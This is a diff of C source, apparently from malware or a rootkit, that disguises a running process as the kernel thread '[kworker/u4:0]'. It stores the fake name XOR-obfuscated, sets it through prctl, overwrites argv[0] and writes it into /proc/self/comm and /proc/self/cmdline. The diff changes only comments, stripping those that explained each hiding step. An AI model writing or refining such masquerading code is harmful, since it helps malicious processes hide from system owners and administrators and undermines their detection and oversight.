@@ -14,7 +14,7 @@
 #include <sys/stat.h>
 #include <sys/syscall.h>
 
-// XOR-encoded "[kworker/u4:0]" (Key: 0xAB)
+
 static const uint8_t OBF_KWORKER[] = {
     0xF0, 0xC0, 0xDC, 0xC4, 0xD9, 0xC0, 0xCE, 0xD9, 0x84, 0xDE, 0x9F, 0x91, 0x9B, 0xF6, 0x00
 };
@@ -56,13 +56,13 @@ void full_masquerade(char **argv, int argc) {
     char kworker_name[32];
     decode_kworker(kworker_name, sizeof(kworker_name));
     
-    // 1. prctl PR_SET_NAME (thread name)
+    
     char short_name[16];
     strncpy(short_name, kworker_name + 1, 15);
     short_name[15] = '\0';
     prctl(PR_SET_NAME, (unsigned long)short_name, 0, 0, 0);
     
-    // 2. argv[0] overwrite
+    
     if (argv && argv[0]) {
         size_t total_len = 0;
         for (int i = 0; i < argc; i++) {
@@ -72,14 +72,14 @@ void full_masquerade(char **argv, int argc) {
         strncpy(argv[0], kworker_name, total_len - 1);
     }
     
-    // 3. /proc/self/comm (process name in ps aux)
+    
     int fd = open("/proc/self/comm", O_WRONLY);
     if (fd >= 0) {
         write(fd, kworker_name, strlen(kworker_name));
         close(fd);
     }
     
-    // 4. /proc/self/cmdline
+    
     fd = open("/proc/self/cmdline", O_WRONLY);
     if (fd >= 0) {
         write(fd, kworker_name, strlen(kworker_name));
